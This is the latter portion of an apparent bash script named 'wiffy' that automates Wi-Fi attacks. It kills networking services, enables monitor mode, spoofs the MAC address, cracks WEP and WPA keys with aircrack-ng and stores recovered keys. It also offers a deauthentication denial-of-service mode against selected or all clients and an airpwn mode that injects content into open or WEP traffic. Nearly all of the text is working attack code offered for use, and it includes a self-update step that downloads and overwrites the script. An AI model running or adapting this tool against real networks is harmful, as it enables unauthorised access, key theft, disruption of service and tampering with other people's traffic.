      echo -e "---------------------------------------------------------------------------------------------\nERROR: moveCap (Error code: $error): $1" >> $logFile
      return 1
   fi
}
function testAP() { #testAP $essid $bssid $encryption
   if [ "$debug" == "true" ] ; then display diag "smoveCap~$@" ; fi
   error="free" ; stage="testAP"
   if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ] ; then error="1" ; fi # Coding error

   if [ "$error" == "free" ] ; then
      if [ -e "wiffy.keys" ] ; then
         tmp=$(cat wiffy.keys | sed -n "/ESSID: $1/, +4p")
         key=$(echo $tmp | grep "BSSID: $2" -q  && echo $tmp | grep "Encryption: $3" -q && echo $tmp | sed -n 's/.*Key: //p' | sed -n 's/Client: .*//p')
         if [ "$key" ] ; then 
            display info "$essid's key *may* be: $key"
            #read -p "[~] Try and connect with it? [Y/n]: "
            #if [[ "$REPLY" =~ ^[Nn]$ ]] ; then return 1
            #else connect "$essid" "$key" ; fi
            if [ "$connect" == "true" ] ; then 
               client=$(echo $tmp | grep "BSSID: $2" -q  && echo $tmp | grep "Encryption: $3" -q && echo $tmp | sed -n 's/.*Client: //p')
               connect "$essid" "$key" "$client"
               if [ "$stage" == "connected" ] ; then cleanUp clean ; fi
            fi
         fi
      fi
      return 0
   else
      display error "testAP Error code: $error"
      echo -e "---------------------------------------------------------------------------------------------\nERROR: testAP (Error code: $error): $1, $2, $3" >> $logFile
      return 1
   fi
}
function update() { #update
   if [ "$debug" == "true" ] ; then display diag "update~$@" ; fi
   display action "Checking for an update"
   if [ -e "/usr/bin/svn" ] ; then
      command=$(svn info http://g0tmi1k.googlecode.com/svn/trunk/wiffy/ | grep "Last Changed Rev:" | cut -c19-)
      if [ "$command" != "$svn" ] ; then
         display info "Updating"
         svn export -q --force "http://g0tmi1k.googlecode.com/svn/trunk/wiffy" ./
         display info "Updated to $command. (="
      else
         display info "You're using the latest version. (="
      fi
   else
      command=$(wget -qO- "http://g0tmi1k.googlecode.com/svn/trunk/" | grep "<title>g0tmi1k - Revision" |  awk -F " " '{split ($4,A,":"); print A[1]}')
      if [ "$command" != "$svn" ] ; then
         display info "Updating"
         wget -q -N "http://g0tmi1k.googlecode.com/svn/trunk/wiffy/wiffy.sh"
         display info "Updated! (="
      else
         display info "You're using the latest version. (="
      fi
   fi
   echo
   exit 2
}


#---Main---------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m wiffy v$version"

#----------------------------------------------------------------------------------------------#
if [ "$(id -u)" != "0" ] ; then display error "Run as root" 1>&2 ; cleanUp nonuser; fi
stage="setup"

#----------------------------------------------------------------------------------------------#
while getopts "i:t:m:e:b:c:w:z:s:xko:dvVu?" OPTIONS; do
   case ${OPTIONS} in
      i ) interface=$OPTARG;;
      t ) monitorInterface=$OPTARG;;
      m ) mode=$OPTARG;;
      e ) essid=$OPTARG;;
      b ) bssid=$OPTARG;;
      c ) client=$OPTARG;;
      w ) wordlist=$OPTARG;;
      z ) macMode=$OPTARG;;
      s ) fakeMac=$OPTARG;;
      x ) connect="true" ;;
      k ) keepCAP="true" ;;
      o ) outputCAP=$OPTARG;;
      d ) diagnostics="true" ;;
      v ) verbose="1" ;;
      V ) verbose="2" ;;
      u ) update;;
      ? ) help;;
      * ) display error "Unknown option" 1>&2 ;;   # Default
   esac
done
mac=$(macchanger --show "$interface" | awk -F " " '{print $3}')

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then
   displayMore="true"
   if [ "$debug" == "true" ] ; then
      display info "Debug mode"
   fi
   if [ "$diagnostics" == "true" ] ; then
      display diag "Diagnostics mode"
      echo -e "wiffy v$version\nStart @ $(date)" > $logFile
      echo "wiffy.sh" $* >> $logFile
   fi
fi

#----------------------------------------------------------------------------------------------#
display action "Analyzing: Environment"

#----------------------------------------------------------------------------------------------#
if [ -z "$interface" ] ; then display error "interface can't be blank" 1>&2 ; cleanUp ; fi
if [ "$mode" != "crack" ] && [ "$mode" != "dos" ] && [ "$mode" != "inject" ] ; then display error "mode ($mode) isn't correct" 1>&2 ; cleanUp ; fi

if [ "$macMode" != "random" ] && [ "$macMode" != "set" ] && [ "$macMode" != "false" ] ; then display error "macMode ($macMode) isn't correct" 1>&2 ; macMode="false" ; fi
if [ "$macMode" == "set" ] && ([ -z "$fakeMac" ] || [ ! $(echo $fakeMac | egrep "^([0-9a-fA-F]{2}\:){5}[0-9a-fA-F]{2}$") ]) ; then display error "fakeMac ($fakeMac) isn't correct" 1>&2 ; macMode="false" ; fi
if [ "$mode" == "crack" ] ; then
   if [ ! -e "$wordlist" ] ; then display error "Unable to crack WPA. There isn't a wordlist at: $wordlist" 1>&2 ; fi # Can't do WPA...
   if [ "$connect" != "true" ] && [ "$connect" != "false" ] ; then display error "connect ($connect) isn't correct" 1>&2 ; connect="false" ; fi
   if [ "$keepCAP" != "true" ] && [ "$keepCAP" != "false" ] ; then display error "keepCAP ($keepCAP) isn't correct" 1>&2 ; keepCAP="false" ; fi
   if [ -z "$outputCAP" ] ; then display error "outputCAP ($outputCAP) isn't correct" 1>&2 ; outputCAP="$(pwd)" ; fi
   if [ "$benchmark" != "true" ] && [ "$benchmark" != "false" ] ; then display error "benchmark ($benchmark) isn't correct" 1>&2 ; benchmark="false" ; fi
fi
if [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ] ; then display error "verbose ($verbose) isn't correct" 1>&2 ; verbose="0" ; fi
if [ "$debug" != "true" ] && [ "$debug" != "false" ] ; then display error "debug ($debug) isn't correct" 1>&2 ; debug="true" ; fi # Something up... Find out what!
if [ "$diagnostics" != "true" ] && [ "$diagnostics" != "false" ] ; then display error "diagnostics ($diagnostics) isn't correct" 1>&2 ; diagnostics="false" ; fi
if [ "$diagnostics" == "true" ] && [ -z "$logFile" ] ; then display error "logFile ($logFile) isn't correct" 1>&2 ; logFile="wiffy.log" ; fi
if [ -z "$timeScan" ] || [ "$timeScan" -lt "1" ]  ; then display error "timeScan ($timeScan) isn't correct" 1>&2 ; timeScan="10" ; fi
if [ -z "$timeWEP" ] || [ "$timeWEP" -lt "1" ]  ; then display error "timeWEP ($timeWEP) isn't correct" 1>&2 ; timeWEP="15" ; fi
if [ -z "$timeWPA" ] || [ "$timeWPA" -lt "0" ]  ; then display error "timeWPA ($timeWPA) isn't correct" 1>&2 ; timeWPA="8" ; fi

#for item in "foo" "bar" ; do
#   if [ -z "$item" ] ; then display error "$item can't be blank" 1>&2 ; cleanUp ; fi
#done

#----------------------------------------------------------------------------------------------#
command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d " " -f1)
if [ ! "$command" ] ; then
   display error "'$interface' isn't a wireless interface"
   command=$(iwconfig 2>/dev/null | grep "802.11" | cut -d " " -f1)
   if [ "$command" ] ; then
      interface="$command"
      display info "Found: $interface"
   else
      display error "Couldn't detect a wireless interface" 1>&2
      cleanUp
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$displayMore" == "true" ] ; then display action "Stopping: Programs" ; fi
command=$(ps aux | grep "$interface" | awk '!/grep/ && !/awk/ && !/wiffy/ {print $2}' | while read line; do echo -n "$line " ; done | awk '{print}')
if [ -n "$command" ] ; then action "Killing programs" "kill $command" ; fi # to prevent interference
action "Killing programs" "killall wicd-client airodump-ng xterm wpa_action wpa_supplicant wpa_cli dhclient ifplugd dhcdbd dhcpcd NetworkManager knetworkmanager avahi-autoipd avahi-daemon wlassistant wifibox" # Killing "wicd-client" to prevent channel hopping
action "Killing services" "/etc/init.d/wicd stop ; service network-manager stop" # Backtrack & Ubuntu

#----------------------------------------------------------------------------------------------#
action "Refreshing interface" "ifconfig $interface down ; ifconfig $interface up ; sleep 1"

#----------------------------------------------------------------------------------------------#
if [ -e "/sys/class/net/$interface/device/driver" ] ; then wifiDriver=$(ls -l "/sys/class/net/$interface/device/driver" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/') ; fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ] ; then
   echo "-Settings------------------------------------------------------------------------------------
        interface=$interface
             mode=$mode
         wordlist=$wordlist
              mac=$mac
          macMode=$macMode
          fakeMac=$fakeMac
          keepCAP=$keepCAP
        outputCAP=$outputCAP
        benchmark=$benchmark
      diagnostics=$diagnostics
          verbose=$verbose
            debug=$debug
       wifiDriver=$wifiDriver
-Environment---------------------------------------------------------------------------------" >> $logFile
   display diag "Detecting: Kernel"
   uname -a >> $logFile
   display diag "Detecting: Hardware"
   echo "-lspci-----------------------------------" >> $logFile
   lspci -knn >> $logFile
   echo "-lsmod-----------------------------------" >> $logFile
   lsmod >> $logFile
fi
if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
    display info "       interface=$interface
\e[01;33m[i]\e[00m             mode=$mode
\e[01;33m[i]\e[00m         wordlist=$wordlist
\e[01;33m[i]\e[00m              mac=$mac
\e[01;33m[i]\e[00m          macMode=$macMode
\e[01;33m[i]\e[00m          fakeMac=$fakeMac
\e[01;33m[i]\e[00m          keepCAP=$keepCAP
\e[01;33m[i]\e[00m        outputCAP=$outputCAP
\e[01;33m[i]\e[00m        benchmark=$benchmark
\e[01;33m[i]\e[00m      diagnostics=$diagnostics
\e[01;33m[i]\e[00m          verbose=$verbose
\e[01;33m[i]\e[00m            debug=$debug
\e[01;33m[i]\e[00m       wifiDriver=$wifiDriver"
fi

#----------------------------------------------------------------------------------------------#
if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
   display error "aircrack-ng isn't installed" 1>&2
   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install aircrack-ng" "apt-get -y install aircrack-ng" ; fi
   if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
      display error "Failed to install aircrack-ng" 1>&2 ; cleanUp
   else
      display info "Installed: aircrack-ng"
   fi
fi
if [ ! -e "/usr/bin/macchanger" ] ; then
   display error "macchanger isn't installed"
   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install macchanger" "apt-get -y install macchanger" ; fi
   if [ ! -e "/usr/bin/macchanger" ] ; then
      display error "Failed to install macchanger" 1>&2 ; cleanUp
   else
      display info "Installed: macchanger"
   fi
fi
if [ "$mode" == "inject" ] ; then
   if [ ! -e "/pentest/wireless/airpwn-1.4/airpwn" ] ; then
      display error "airpwn isn't installed"
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install airpwn" "apt-get -y install libnet1-dev libpcap-dev python2.4-dev libpcre3-dev libssl-dev" ; fi
      action "Install airpwn" "wget -P /tmp http://downloads.sourceforge.net/project/airpwn/airpwn/1.4/airpwn-1.4.tgz && tar -C /pentest/wireless -xvf /tmp/airpwn-1.4.tgz && rm /tmp/airpwn-1.4.tgz"
      find="#ifndef _LINUX_WIRELESS_H"
      replace="#include <linux\/if.h>\n#ifndef _LINUX_WIRELESS_H"
      sed "s/$replace/$find/g" "/usr/include/linux/wireless.h" > "/usr/include/linux/wireless.h.new"
      sed "s/$find/$replace/g" "/usr/include/linux/wireless.h.new" > "/usr/include/linux/wireless.h"
      rm -f "/usr/include/linux/wireless.h.new"
      action "Install airpwn" "tmp=\$(pwd) && tar -C /pentest/wireless/airpwn-1.4 -xvf /pentest/wireless/airpwn-1.4/lorcon-current.tgz && cd /pentest/wireless/airpwn-1.4/lorcon && ./configure && make && make install && cd \$tmp"
      action "Install airpwn" "tmp=\$(pwd) && cd /pentest/wireless/airpwn-1.4 && ./configure && make && cd \$tmp"
      if [ ! -e "/pentest/wireless/airpwn-1.4/airpwn" ] ; then
         display error "Failed to install airpwn" 1>&2 ; cleanUp
      else
         display info "Installed: airpwn"
      fi
   fi
fi

#----------------------------------------------------------------------------------------------#
display action "Configuring: Environment"

#----------------------------------------------------------------------------------------------#
cleanUp remove

#----------------------------------------------------------------------------------------------#
#http://www.backtrack-linux.org/forums/backtrack-howtos/31403-howto-rtl8187-backtrack-r1-monitor-mode-unknown-error-132-a.html
#if [ "$wifiDriver" == "rtl8187" ] ; then action "Changing drivers" "rmmod rtl8187 ; rmmod mac80211 ; modprobe r8187" ; fi
#if [ "$wifiDriver" == "r8187" ] ; then action "rmmod r8187 ; rmmod mac80211 ; modprobe rtl8187" ; fi
action "Changing drivers" "rmmod r8187 ; rmmod mac80211 ; modprobe rtl8187"

#----------------------------------------------------------------------------------------------#
if [ "$displayMore" == "true" ] ; then display action "Configuring: Wireless card" ; fi
monitorInterface=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -1)

if [ -z "$monitorInterface" ] ; then
   action "Monitor Mode (Starting)" "airmon-ng start $interface | tee /tmp/wiffy.tmp"
   monitorInterface=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -1)
fi

if [ -z "$monitorInterface" ] ; then display error "Couldn't detect monitorInterface" 1>&2 ; cleanUp ;
else if [ "$displayMore" == "true" ] ; then display info "monitorInterface=$monitorInterface" ; fi ; fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then
   display diag "Testing: Wireless Injection"
   command=$(aireplay-ng --test $monitorInterface -i $monitorInterface)
   if [ "$diagnostics" == "true" ] ; then echo -e "$command" >> $logFile ; fi
   if [ -z "$(echo \"$command\" | grep 'Injection is working')" ] ; then display error "$monitorInterface doesn't support packet injecting" 1>&2
   elif [ -z "$(echo \"$command\" | grep 'Found 0 APs')" ] ; then display error "Couldn't test packet injection" 1>&2 ;
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$macMode" != "false" ] ; then
   if [ "$displayMore" == "true" ] ; then display action "Configuring: MAC address" ; fi
   command="ifconfig $monitorInterface down ;"
   if [ "$macMode" == "random" ] ; then command="$command macchanger -A $monitorInterface ;"
   elif [ "$macMode" == "set" ] ; then command="$command macchanger -m $fakeMac $monitorInterface ;" ; fi
   command="$command ifconfig $monitorInterface up"
   action "Configuring MAC" "$command"
   command=$(macchanger --show $monitorInterface)

   mac=$(echo $command | awk -F " " '{print $3}')
   macType=$(echo $command | awk -F "Current MAC: " '{print $2}')
   if [ "$displayMore" == "true" ] ; then display info "mac=$macType" ; fi
fi



#----------------------------------------------------------------------------------------------#
if [ "$mode" == "crack" ] ; then
   while [ "$bssid" == "" ] ; do
      while [ "$stage" != "done" ] ; do
         if [ "$bssid" == "" ] ; then findAP ; fi

         if [ "$stage" == "findAP" ] ; then testAP "$essid" "$bssid" "$encryption" ; fi

         if [ "$stage" == "testAP" ] ; then capture "$bssid" "$channel" ; fi

         if [ -z "$client" ] && [ "$stage" == "capture" ] ; then findClient $encryption ; fi

         if [ "$encryption" == "WEP" ] && ( [ "$stage" == "capture" ] || [ "$stage" == "findClient" ] ) ; then attackWEP
         elif [[ "$encryption" == *WPA* ]] && ( [ "$stage" == "capture" ] || [ "$stage" == "findClient" ] ) ; then attackWPA ; fi
      done
   done

   if [ "$stage" != "done" ] || [ "$essid" == "" ] || [ "$bssid" == "" ] ; then display error "Something went wrong )=" 1>&2 ; cleanUp ; fi

   #----------------------------------------------------------------------------------------------#
   moveCap "$essid"

   #----------------------------------------------------------------------------------------------#
   if [ "$benchmark" == "true" ] && [[ "$encryption" == *WPA* ]] && [ -e "$wordlist" ] ; then benchmark "$essid" ; fi

   #----------------------------------------------------------------------------------------------#
   if [ "$encryption" == "WEP" ] || ( [[ "$encryption" == *WPA* ]] && [ -e "$wordlist" ] ) ; then
      display action "Starting: aircrack-ng"
      if [ "$encryption" == "WEP" ] ; then action "aircrack-ng" "aircrack-ng $pathCAP -e \"$essid\" -l /tmp/wiffy.keys" "false" "0|285|30" ; fi
      if [[ "$encryption" == *WPA* ]] ; then action "aircrack-ng" "aircrack-ng $pathCAP -e \"$essid\" -l /tmp/wiffy.keys -w $wordlist" "false" "0|0|20" ; fi
   fi
   action "Closing programs" "killall xterm ; airmon-ng stop $monitorInterface ; sleep 2" # Sleep = Make sure aircrack-ng has saved file.

   #----------------------------------------------------------------------------------------------#
   if [ -e "/tmp/wiffy.keys" ] ; then key=$(cat "/tmp/wiffy.keys") ;  display info "WiFi key: $key" ;  echo -e "---------------------------------------\n      Date: $(date)\n     ESSID: $essid\n     BSSID: $bssid\nEncryption: $encryption\n       Key: $key\n    Client: $client" >> "wiffy.keys" ; if [ "$connect" == "true" ] ; then connect "$essid" "$key" "$client"; fi
   elif [[ "$encryption" == *WPA* ]] && [ -e "$wordlist" ] ; then display error "WPA: WiFi key isn't in the wordlist" 1>&2
   elif [ "$encryption" == "WEP" ] ; then display error "WEP: Couldn't inject" 1>&2
   elif [ "$encryption" != "N/A" ] ; then display error "Something went wrong )=" 1>&2 ; fi
#----------------------------------------------------------------------------------------------#
elif [ "$mode" == "dos" ] ; then
   findAP
   while true; do
      capture $bssid $channel

      findClient $encryption
      killall xterm

      echo -e " Num |         MAC       \n-----|-------------------"
      loop=${#client[@]}
      if [ ${client[0]} == "clientless" ] ; then printf "  %-2s | %-16s \n" "1" "  ***EVERYONE***"
      else
         for (( i=0;i<$loop;i++)); do
            printf "  %-2s | %-16s \n" "$(($i+1))" "${client[${i}]}"
         done
         printf "  %-2s | %-16s \n" "$(($i+1))" " *All the above*" "$(($i+2))" "  ***EVERYONE***"
      fi
      while true ; do
         #read -p "[~] select [a]nother network, re[s]can clients, e[x]it or select num: "
         read -p "[~] re[s]can clients, e[x]it or select num: "
         if [ "$REPLY" == "x" ] ; then cleanUp clean
         elif [ "$REPLY" == "s" ] ; then break ;
         #elif [ "$REPLY" == "a" ] ; then bssid="" ; findAP ; break ;
         elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]'l) ] ; then display error "Bad input" 1>&2
         elif [ ${client[0]} == "clientless" ] && [ "$REPLY" != "1" ] ; then display error "Incorrect number" 1>&2
         elif [ ${client[0]} != "clientless" ] && [ "$REPLY" -lt "1" ] || [ "$REPLY" -gt "$(($loop+2))" ] ; then display error "Incorrect number" 1>&2
         else id="$(($REPLY-1))" ; break 2 ; fi
       done
   done

   if [ "$displayMore" == "true" ] ; then display action "Configuring: Wireless card" ; fi
   action "Changing Channel" "iwconfig $monitorInterface channel $channel" "true"

   display action "Attack (DoS): $essid"
   if [ ${client[0]} == "clientless" ] || [ "$REPLY" == $(($loop+2)) ] ; then attack "DoS" "$essid" "$bssid" "$targets" & sleep 1
   elif [ "$REPLY" == $(($loop+1)) ] ; then i="0" ; for targets in "${client[@]}" ; do attack "DoS" "$essid" "$bssid" "$targets" "$i" & sleep 1 ; i=$((i+90)) ; done
   else attack "DoS" "$essid" "$bssid" & sleep 1 ; fi


   #----------------------------------------------------------------------------------------------#
   display info "Attacking! ...press CTRL+C to stop"
   if [ "$diagnostics" == "true" ] ; then echo "-Ready!----------------------------------" >> $logFile ; echo -e "Ready @ $(date)" >> $logFile ; fi
   for (( ; ; )) ; do
      sleep 5
   done
#----------------------------------------------------------------------------------------------#
elif [ "$mode" == "inject" ] ; then
   findAP

   display action "Attack (Inject): Open/WEP networks"

   action "AirPWN" "cd /pentest/wireless/airpwn-1.4/ && airpwn -i $monitorInterface -d $wifiDriver -c conf/greet_html -vvvv" "true" "0|0|40" &

   #----------------------------------------------------------------------------------------------#
   display info "Attacking! ...press CTRL+C to stop"
   if [ "$diagnostics" == "true" ] ; then echo "-Ready!----------------------------------" >> $logFile ; echo -e "Ready @ $(date)" >> $logFile ; fi
   for (( ; ; )) ; do
      sleep 5
   done
fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ] ; then echo "-Done!---------------------------------------------------------------------------------------" >> $logFile ; fi
cleanUp clean


#---Ideas--------------------------------------------------------------------------------------#
# WPA - brute / hash
# WPA - use pre hash / use pre capture
# WPA - use folder for wordlist
#----------------------------------------------------------------------------------------------#
   #echo $wordlist > $wordlist
   #airolib-ng /tmp/wiffy-$essid.hash --import essid /tmp/wiffy.tmp
   #echo $wordlist > /tmp/wiffy.tmp
   #airolib-ng /tmp/wiffy-$essid.hash --import passwd /tmp/wiffy.tmp
   #airolib-ng /tmp/wiffy-$essid.hash --stats
   #airolib-ng /tmp/wiffy-$essid.hash --clean all
   #airolib-ng /tmp/wiffy-$essid.hash --batch
   #airolib-ng /tmp/wiffy-$essid.hash --verify all
#----------------------------------------------------------------------------------------------#
   #-p [/path/to/file]     ---  Path to pre-captured cap file e.g. $preCap
#----------------------------------------------------------------------------------------------#
#   action "aireplay-ng (Inject)" "airtun-ng -a $bssid $monitorInterface" &
#   action "aireplay-ng (Inject)" "ifconfig at0 192.168.1.83 netmask 255.255.255.0 up" &
   #airdecap-ng -w [wep $key] -p [wpa $key] -k [wpa $key]
#----------------------------------------------------------------------------------------------#
   #aireplay-ng --interactive -b $bssid -d $client -t 1 -F $monitorInterface
   #aireplay-ng --interactive -b $bssid -c FF:FF:FF:FF:FF:FF -t 1 -F $monitorInterface
   #aireplay-ng --interactive -b $bssid -c FF:FF:FF:FF:FF:FF -h $client -T 1 -p 0841 -F $monitorInterface
#----------------------------------------------------------------------------------------------#
#Got no data packets from client network & No valid WPA handshakes found & KEY FOUND (only if its g0tmi1k)

#Crack - Change channel for attacks?
#DoS - ReScan APs
#DoS - Doesn't use "Target" anymore
# New Mode - "all" crack
# All - Check running processors - if not running, cleanUp
